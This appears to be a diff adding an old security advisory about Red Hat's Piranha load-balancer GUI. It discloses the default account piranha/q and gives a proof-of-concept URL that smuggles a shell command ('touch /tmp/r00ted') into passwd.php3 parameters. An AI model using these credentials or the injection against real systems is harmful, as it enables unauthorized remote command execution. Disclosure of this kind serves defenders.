@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/1148/info
+
+A default username and password has been discovered in the Piranha virtual server and load balancing package from RedHat. Version 0.4.12 of the piranha-gui program contains a default account, piranha, with the password 'q' (no quotes). Using this username and password, in conjunction with flaws in the passwd.php3 script (also part of piranha) will allow remote users to execute arbitrary commands on the machine.
+
+The default username and password are piranha, and q, respectively.
+
+Execute the following url, using the above information to authenticate: http://victim.example.com/piranha/secure/passwd.php3
+
+Next, execute the following: http://victim.example.com/piranha/secure/passwd.php3?try1=g23+%3B+touch+%2Ftmp%2Fr00ted+%3B&try2=g23+%3B+touch+%2Ftmp%2Fr00ted+%3B&passwd=ACCEPT
+
+This will touch a file in /tmp named r00ted. More complex attacks are certainly possible.
